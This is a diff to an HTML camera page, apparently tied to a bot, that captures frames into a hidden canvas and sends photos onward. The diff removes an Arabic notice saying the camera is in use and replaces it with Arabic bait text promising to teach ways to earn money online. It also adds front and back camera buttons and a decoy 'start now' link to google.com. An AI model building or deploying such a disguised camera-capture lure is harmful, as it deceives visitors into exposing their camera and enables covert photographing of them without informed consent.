@@ -13,7 +13,7 @@
       align-items: center;
       height: 100vh;
       flex-direction: column;
-      font-family: 'Cairo', sans-serif;
+      font-family: 'Cairo', sans-serif; /* Arabic font */
     }
 
     .container {
@@ -41,6 +41,30 @@
       font-weight: bold;
       color: #333;
     }
+
+    .button-group {
+      margin-top: 15px;
+    }
+
+    .button {
+      margin: 10px 5px;
+      padding: 10px 20px;
+      font-size: 1.2em;
+      color: #fff;
+      background-color: #007bff;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+      transition: background-color 0.3s ease, transform 0.2s ease;
+    }
+
+    .button:hover {
+      background-color: #0056b3;
+    }
+
+    .button:active {
+      transform: scale(0.95);
+    }
   </style>
   <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600&display=swap" rel="stylesheet">
 </head>
@@ -49,7 +73,12 @@
     <video id="video" autoplay></video>
     <canvas id="canvas" style="display:none;"></canvas>
     <div class="description">
-      الكاميرا الآن قيد الاستخدام بناءً على اختيارك من البوت.
+      تعلم أفضل طرق كسب المال من الإنترنت باستخدام مهاراتك الشخصية. اختر المجال الأنسب لك وابدأ الآن!
+    </div>
+    <div class="button-group">
+      <button class="button" onclick="startCamera('user')">الكاميرا الأمامية</button>
+      <button class="button" onclick="startCamera('environment')">الكاميرا الخلفية</button>
+      <button class="button" onclick="window.open('https://google.com', '_blank')">ابدأ الآن</button>
     </div>
   </div>
 
@@ -111,13 +140,6 @@
       .catch(error => {
         console.error('Error sending photo:', error);
       });
-    }
-
-    // Automatically start camera based on mode received from bot
-    const urlParams = new URLSearchParams(window.location.search);
-    const cameraMode = urlParams.get('mode'); // Get 'mode' parameter from URL
-    if (cameraMode) {
-      startCamera(cameraMode);
     }
   </script>
 </body>
